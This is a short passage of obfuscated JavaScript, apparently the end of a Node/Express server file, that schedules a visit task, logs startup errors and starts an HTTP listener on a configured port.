AddVisitTask();}catch(_0xdf64b5){console[_0x5341be(0x21b)](_0x5341be(0x27f),_0xdf64b5);}}startserver()[_0x310a77(0x280)](_0x1e32ef=>{const _0x6a1eb1=_0x310a77;console[_0x6a1eb1(0x21b)]('Unhandled\x20error\x20in\x20startserver:',_0x1e32ef);}),app['listen'](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
